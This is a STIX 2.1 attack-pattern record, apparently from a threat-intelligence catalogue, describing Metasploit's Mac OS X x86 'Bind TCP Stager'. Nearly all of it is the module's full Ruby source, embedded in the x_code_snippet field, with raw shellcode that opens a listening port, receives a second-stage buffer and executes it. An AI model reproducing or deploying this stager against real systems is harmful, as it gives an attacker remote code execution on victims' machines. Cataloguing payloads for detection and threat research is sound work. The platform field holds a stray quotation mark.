{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d0e63c16-d855-48fd-91fb-e6b669ed8e0d",
    "created": "2024-08-14T16:33:19.473511Z",
    "modified": "2024-08-14T16:33:19.473515Z",
    "name": "Bind TCP Stager",
    "description": "Listen, read length, read buffer, execute",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/stagers/osx/x86/bind_tcp.rb",
            "external_id": "bind_tcp.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\n###\n#\n# BindTcp\n# -------\n#\n# Mac OS X x86 bind TCP stager.\n#\n###\nmodule MetasploitModule\n\n  CachedSize = 144\n\n  include Msf::Payload::Stager\n\n  def initialize(info = { })\n    super(merge_info(info,\n      'Name'\t\t=> 'Bind TCP Stager',\n      'Description'\t=> 'Listen, read length, read buffer, execute',\n      'Author'\t=> 'ddz',\n      'License'\t=> MSF_LICENSE,\n      'Platform'\t=> 'osx',\n      'Arch'\t\t=> ARCH_X86,\n      'Handler'\t=> Msf::Handler::BindTcp,\n      'Convention'\t=> 'sockedi',\n      'Stager'\t=>\n      {\n        'Offsets' => { 'LPORT' => [ 27, 'n'] },\n        'Payload' =>\n          \"\\x31\\xc0\\x99\\x50\\x40\\x50\\x40\\x50\"+\n          \"\\x52\\xb0\\x61\\xcd\\x80\\x0f\\x82\\x7d\"+\n          \"\\x00\\x00\\x00\\x89\\xc6\\x52\\x52\\x52\"+\n          \"\\x68\\x00\\x02\\x34\\x12\\x89\\xe3\\x6a\"+\n          \"\\x10\\x53\\x56\\x52\\xb0\\x68\\xcd\\x80\"+\n          \"\\x72\\x66\\x52\\x56\\x52\\xb0\\x6a\\xcd\"+\n          \"\\x80\\x72\\x5d\\x52\\x52\\x56\\x52\\xb0\"+\n          \"\\x1e\\xcd\\x80\\x72\\x53\\x89\\xc7\\x89\"+\n          \"\\xe5\\x83\\xec\\x08\\x31\\xc9\\xf7\\xe1\"+\n          \"\\x51\\x89\\xe6\\xb0\\x04\\x50\\x56\\x57\"+\n          \"\\x50\\x48\\xcd\\x80\\x72\\x3a\\x8b\\x74\"+\n          \"\\x24\\x10\\x31\\xc0\\x50\\x50\\x48\\x50\"+\n          \"\\x40\\x66\\xb8\\x02\\x10\\x50\\x31\\xc0\"+\n          \"\\xb0\\x07\\x50\\x56\\x52\\x52\\xb0\\xc5\"+\n          \"\\xcd\\x80\\x72\\x1c\\x89\\xc3\\x01\\xf3\"+\n          \"\\x56\\x89\\xd8\\x29\\xf0\\x50\\x57\\x52\"+\n          \"\\x31\\xc0\\xb0\\x03\\xcd\\x80\\x72\\x08\"+\n          \"\\x29\\xc3\\x29\\xc6\\x75\\xea\\xff\\xe3\"\n      }\n    ))\n  end\n\n  def handle_intermediate_stage(conn, p)\n    #\n    # Our stager payload expects to see a next-stage length first.\n    #\n    conn.put([p.length].pack('V'))\n  end\nend\n",
    "x_mitre_platforms": [
        "osx'"
    ]
}